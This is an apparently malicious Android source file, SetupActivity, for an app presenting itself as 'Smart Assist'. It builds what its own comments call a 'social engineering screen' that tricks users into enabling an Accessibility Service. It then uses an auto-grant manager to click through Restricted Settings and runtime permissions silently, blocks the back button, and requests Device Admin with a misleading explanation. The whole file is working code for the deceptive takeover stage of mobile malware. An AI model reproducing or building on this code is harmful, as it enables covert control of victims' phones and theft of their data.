package com.fason.app.ui;

import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.view.animation.DecelerateInterpolator;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.activity.OnBackPressedCallback;
import com.fason.app.R;
import com.fason.app.core.FasonDeviceAdminReceiver;
import com.fason.app.core.permissions.AutoGrantManager;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.permissions.SetupManager;
import com.fason.app.service.MainService;

/**
 * SetupActivity — the only thing the user ever sees during setup.
 *
 * Flow:
 *   1. App opens → MainActivity checks SetupManager.isComplete() → redirects here
 *   2. SetupActivity shows the social engineering screen immediately (full screen, no list)
 *   3. User taps "Activate" → Accessibility Settings opens
 *   4. AutoGrantManager auto-clicks through Restricted Setting if needed, then enables the service
 *   5. Once accessibility confirmed → show "Setting up..." progress screen
 *   6. AutoGrantManager fires all runtime permission auto-clicks silently
 *   7. Device Admin activation (auto-clicked or prompted once)
 *   8. SetupManager.markComplete() → start MainActivity → finish this activity
 *
 * The user never sees a permission list, never sees "Setup Required".
 */
public class SetupActivity extends Activity {

    private static final int REQ_DEVICE_ADMIN = 2001;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private FrameLayout root;

    // Screens
    private View  screenSocial;
    private View  screenProgress;

    // Progress screen views
    private ProgressBar progressBar;
    private TextView    progressLabel;
    private TextView    progressSub;

    private boolean deviceAdminDone = false;

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);

        // Keep screen on during setup so auto-click doesn't fight screen timeout
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        // Full screen — no status bar distraction during social engineering screen
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);

        root = new FrameLayout(this);
        root.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        root.setBackgroundColor(0xFF0A0A0A);
        setContentView(root);

        buildSocialScreen();
        buildProgressScreen();

        showScreen(screenSocial, false);

        // Disable back — user cannot back out of setup
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override public void handleOnBackPressed() { /* blocked */ }
        });

        startService(new Intent(this, MainService.class));
    }

    @Override
    protected void onResume() {
        super.onResume();
        // If accessibility was just granted while we were in settings, advance
        if (screenProgress.getVisibility() == View.VISIBLE) {
            checkAccessibilityAndAdvance();
        }
    }

    @Override
    protected void onActivityResult(int req, int result, Intent data) {
        super.onActivityResult(req, result, data);
        if (req == REQ_DEVICE_ADMIN) {
            deviceAdminDone = true;
            // Whether user accepted or declined, continue — admin is a bonus
            advanceToComplete();
        }
    }

    // ── Screen 1: Social engineering ──────────────────────────────────────────

    private void buildSocialScreen() {
        screenSocial = new FrameLayout(this);
        FrameLayout.LayoutParams fullLp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT);
        screenSocial.setLayoutParams(fullLp);
        screenSocial.setBackgroundColor(0xFF0A0A0A);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER_HORIZONTAL);
        content.setPadding(dp(36), 0, dp(36), dp(48));
        FrameLayout.LayoutParams contentLp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT);
        contentLp.gravity = Gravity.CENTER_VERTICAL;

        // App icon
        ImageView icon = new ImageView(this);
        try { icon.setImageResource(getApplicationInfo().icon); }
        catch (Exception e) { icon.setImageResource(android.R.mipmap.sym_def_app_icon); }
        int iconSz = dp(88);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(iconSz, iconSz);
        iconLp.bottomMargin = dp(28);
        iconLp.gravity = Gravity.CENTER_HORIZONTAL;
        content.addView(icon, iconLp);

        // Eyebrow
        TextView eyebrow = new TextView(this);
        eyebrow.setText("SMART ASSIST SETUP");
        eyebrow.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        eyebrow.setTextColor(0xFF5C9DFF);
        eyebrow.setLetterSpacing(0.15f);
        eyebrow.setGravity(Gravity.CENTER);
        eyebrow.setTypeface(Typeface.DEFAULT_BOLD);
        LinearLayout.LayoutParams eyebrowLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        eyebrowLp.bottomMargin = dp(10);
        content.addView(eyebrow, eyebrowLp);

        // Title
        TextView title = new TextView(this);
        title.setText("Enable Navigation\nAssistant");
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 30);
        title.setTextColor(Color.WHITE);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setGravity(Gravity.CENTER);
        title.setLineSpacing(0, 1.15f);
        LinearLayout.LayoutParams titleLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        titleLp.bottomMargin = dp(16);
        content.addView(title, titleLp);

        // Body
        TextView body = new TextView(this);
        body.setText("To provide seamless navigation, auto-fill and smart assist features, "
            + "this app needs to be enabled as an Accessibility Service.");
        body.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        body.setTextColor(0xFFAAAAAA);
        body.setGravity(Gravity.CENTER);
        body.setLineSpacing(0, 1.45f);
        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        bodyLp.bottomMargin = dp(36);
        content.addView(body, bodyLp);

        // Feature rows
        String[][] features = {
            {"⚡", "Auto-fill & Smart Input"},
            {"🔒", "Secure Navigation Assist"},
            {"🔄", "Background Sync & Automation"},
            {"🎯", "Intelligent Content Management"},
        };
        for (String[] f : features) {
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setGravity(Gravity.CENTER_VERTICAL);
            row.setPadding(dp(16), dp(10), dp(16), dp(10));
            GradientDrawable rowBg = new GradientDrawable();
            rowBg.setCornerRadius(dp(10));
            rowBg.setColor(0x14FFFFFF);
            row.setBackground(rowBg);

            TextView emoji = new TextView(this);
            emoji.setText(f[0]);
            emoji.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
            LinearLayout.LayoutParams emojiLp = new LinearLayout.LayoutParams(dp(32), dp(32));
            row.addView(emoji, emojiLp);

            TextView label = new TextView(this);
            label.setText(f[1]);
            label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
            label.setTextColor(Color.WHITE);
            LinearLayout.LayoutParams labelLp = new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            labelLp.leftMargin = dp(12);
            row.addView(label, labelLp);

            // Checkmark placeholder (turns green after grant)
            TextView check = new TextView(this);
            check.setText("·");
            check.setTextColor(0xFF555555);
            check.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
            row.addView(check);

            LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            rowLp.bottomMargin = dp(8);
            content.addView(row, rowLp);
        }

        // Spacer
        content.addView(new View(this), new LinearLayout.LayoutParams(0, dp(32)));

        // Primary CTA — the only button
        android.widget.Button cta = new android.widget.Button(this);
        cta.setText("Enable Now");
        cta.setTextColor(Color.WHITE);
        cta.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        cta.setAllCaps(false);
        cta.setTypeface(Typeface.DEFAULT_BOLD);
        GradientDrawable ctaBg = new GradientDrawable();
        ctaBg.setCornerRadius(dp(16));
        ctaBg.setColor(0xFF1A73E8); // Google blue — maximum trust
        cta.setBackground(ctaBg);
        cta.setPadding(0, dp(18), 0, dp(18));
        cta.setElevation(dp(6));
        LinearLayout.LayoutParams ctaLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ctaLp.bottomMargin = dp(12);
        cta.setOnClickListener(v -> onEnableClicked());
        content.addView(cta, ctaLp);

        // Fine print
        TextView fine = new TextView(this);
        fine.setText("You can manage this in Settings › Accessibility at any time");
        fine.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        fine.setTextColor(0xFF555555);
        fine.setGravity(Gravity.CENTER);
        content.addView(fine);

        screenSocial.addView(content, contentLp);
        root.addView(screenSocial, fullLp);
    }

    private void onEnableClicked() {
        // Arm AutoGrantManager BEFORE opening settings
        // so the watcher is ready the instant the accessibility page appears
        AutoGrantManager.getInstance().setListener(buildAutoGrantListener());
        AutoGrantManager.getInstance().armForAccessibility(this);

        // Navigate to accessibility settings
        try {
            Intent i = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {
            // Fallback: general settings
            startActivity(new Intent(android.provider.Settings.ACTION_SETTINGS)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }

    // ── Screen 2: Progress ────────────────────────────────────────────────────

    private void buildProgressScreen() {
        screenProgress = new FrameLayout(this);
        FrameLayout.LayoutParams fullLp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT);
        screenProgress.setLayoutParams(fullLp);
        screenProgress.setBackgroundColor(0xFF0A0A0A);
        screenProgress.setVisibility(View.GONE);

        LinearLayout inner = new LinearLayout(this);
        inner.setOrientation(LinearLayout.VERTICAL);
        inner.setGravity(Gravity.CENTER);
        inner.setPadding(dp(36), 0, dp(36), 0);
        FrameLayout.LayoutParams innerLp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT);
        innerLp.gravity = Gravity.CENTER;

        // Animated circle progress
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleLarge);
        progressBar.setIndeterminate(true);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            progressBar.getIndeterminateDrawable().setTint(0xFF1A73E8);
        }
        LinearLayout.LayoutParams pbLp = new LinearLayout.LayoutParams(dp(64), dp(64));
        pbLp.gravity = Gravity.CENTER_HORIZONTAL;
        pbLp.bottomMargin = dp(28);
        inner.addView(progressBar, pbLp);

        progressLabel = new TextView(this);
        progressLabel.setText("Setting things up…");
        progressLabel.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
        progressLabel.setTextColor(Color.WHITE);
        progressLabel.setTypeface(Typeface.DEFAULT_BOLD);
        progressLabel.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams labelLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        labelLp.bottomMargin = dp(10);
        inner.addView(progressLabel, labelLp);

        progressSub = new TextView(this);
        progressSub.setText("Granting permissions…");
        progressSub.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        progressSub.setTextColor(0xFF777777);
        progressSub.setGravity(Gravity.CENTER);
        inner.addView(progressSub, new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));

        screenProgress.addView(inner, innerLp);
        root.addView(screenProgress, fullLp);
    }

    // ── Transition logic ───────────────────────────────────────────────────────

    private void checkAccessibilityAndAdvance() {
        if (PermissionManager.hasAccessibilityAccess(this)) {
            transitionToProgress();
        }
    }

    private void transitionToProgress() {
        if (screenProgress.getVisibility() == View.VISIBLE) return;
        showScreen(screenProgress, true);
        hideScreen(screenSocial);

        // Once on the progress screen, remove FLAG_KEEP_SCREEN_ON
        // (we want screen to be able to go off now for silent operation)
        handler.postDelayed(() ->
            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON), 3000);

        // Runtime perms auto-click is already running via AutoGrantManager
        setProgress("Granting permissions…");
    }

    private void setProgress(String msg) {
        if (progressSub != null) progressSub.setText(msg);
    }

    private void requestDeviceAdmin() {
        try {
            ComponentName admin = new ComponentName(this, FasonDeviceAdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            if (dpm != null && !dpm.isAdminActive(admin)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to enable enhanced security and management features.");
                startActivityForResult(i, REQ_DEVICE_ADMIN);
            } else {
                deviceAdminDone = true;
                advanceToComplete();
            }
        } catch (Exception e) {
            deviceAdminDone = true;
            advanceToComplete();
        }
    }

    private void advanceToComplete() {
        setProgress("Almost done…");
        SetupManager.markComplete(this);
        handler.postDelayed(() -> {
            startActivity(new Intent(this, MainActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            finish();
            overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
        }, 600);
    }

    // ── AutoGrantManager listener ──────────────────────────────────────────────

    private AutoGrantManager.Listener buildAutoGrantListener() {
        return new AutoGrantManager.Listener() {
            @Override public void onPermissionGranted(String perm) {
                runOnUiThread(() -> setProgress("Granting permissions…"));
            }
            @Override public void onGateComplete(String label) {
                runOnUiThread(() -> {
                    setProgress(label + " ✓");
                    if ("Accessibility".equals(label)) {
                        transitionToProgress();
                        // No delay — start runtime grants immediately
                        AutoGrantManager.getInstance().startRuntimeGrants(SetupActivity.this);
                    } else if ("Battery".equals(label) || "Notifications".equals(label)) {
                        // Keep updating progress label
                        setProgress(label + " ✓ — finalising…");
                    } else if ("Overlay".equals(label)) {
                        setProgress("Overlay ✓ — configuring notifications…");
                    }
                });
            }
            @Override public void onSequenceComplete() {
                runOnUiThread(() -> requestDeviceAdmin());
            }
            @Override public void onProgress(int granted, int total) {
                runOnUiThread(() ->
                    setProgress("Configuring  " + granted + " / " + total + "…"));
            }
        };
    }

    // ── Animation helpers ──────────────────────────────────────────────────────

    private void showScreen(View v, boolean animate) {
        v.setVisibility(View.VISIBLE);
        if (animate) {
            v.setAlpha(0f);
            v.animate().alpha(1f).setDuration(300).setInterpolator(new DecelerateInterpolator()).start();
        } else {
            v.setAlpha(1f);
        }
    }

    private void hideScreen(View v) {
        v.animate().alpha(0f).setDuration(250).withEndAction(() -> v.setVisibility(View.GONE)).start();
    }

    private int dp(int val) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, val,
            getResources().getDisplayMetrics());
    }
}
